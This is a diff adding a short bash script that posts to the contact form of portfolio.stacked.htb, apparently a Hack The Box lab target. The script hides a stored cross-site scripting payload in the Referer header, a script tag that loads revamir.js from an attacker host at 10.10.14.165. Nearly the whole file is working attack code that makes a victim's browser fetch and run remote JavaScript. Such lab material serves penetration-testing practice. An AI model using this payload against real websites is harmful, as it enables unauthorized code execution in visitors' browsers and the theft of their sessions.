@@ -1,0 +1,5 @@
+#!/bin/bash
+curl -i -s -k -X $'POST' \
+    -H $'Host: portfolio.stacked.htb' -H $'Content-Length: 149' -H $'Accept: application/json, text/javascript, */*; q=0.01' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Origin: http://portfolio.stacked.htb/' -H $'Referer: <script src=\"http://10.10.14.165/revamir.js\"></script>' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
+    --data-binary $'fullname=test&email=test%40test.com&tel=123123123123&subject=test&message=test' \
+    $'http://portfolio.stacked.htb/process.php'
